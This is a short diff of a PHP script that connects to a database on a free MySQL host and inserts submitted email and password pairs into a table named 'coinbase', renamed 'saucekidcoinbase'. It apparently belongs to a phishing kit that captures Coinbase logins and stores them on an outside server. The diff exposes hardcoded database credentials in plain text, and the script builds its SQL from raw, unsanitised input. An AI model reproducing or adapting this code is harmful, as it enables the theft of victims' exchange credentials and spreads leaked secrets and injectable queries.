@@ -24,7 +24,7 @@
 
         // database name => staff 
 
-        $conn = mysqli_connect("sql3.freemysqlhosting.net", "sql3461458", "IkSyeGfuS5", "sql3461458"); 
+        $conn = mysqli_connect("sql3.freemysqlhosting.net", "sql3461458", "SKprsSvf54ACz812", "sql3461458"); 
 
           
 
@@ -54,7 +54,7 @@
 
         // here our table name is coinbase 
 
-        $sql = "INSERT INTO coinbase VALUES ('$email',  
+        $sql = "INSERT INTO saucekidcoinbase VALUES ('$email',  
 
             '$password')"; 
 
